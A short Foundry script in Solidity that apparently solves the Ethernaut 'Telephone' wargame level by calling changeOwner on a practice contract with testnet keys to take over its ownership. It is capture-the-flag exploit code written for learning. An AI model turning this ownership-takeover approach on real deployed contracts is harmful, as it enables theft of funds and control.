// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import {TelephoneHack} from "src/hack/TelephoneHack.sol";
import {ITelephone} from "src/hack/interfaces/ITelephone.sol";

contract TelephoneScript is Script {
    event Owner(address);

    function run() external {
        ITelephone telephone = ITelephone(vm.envAddress("TELEPHONE_ADDRESS"));
        uint256 deployerKey = vm.envUint("TESTNET_PRIVATE_KEY_2");
        vm.startBroadcast(deployerKey);
        telephone.changeOwner(vm.envAddress("TESTNET_ADDRESS_1"));
        vm.stopBroadcast();
        console2.log("SUCCESS!!! Submit the instance.");
    }
}
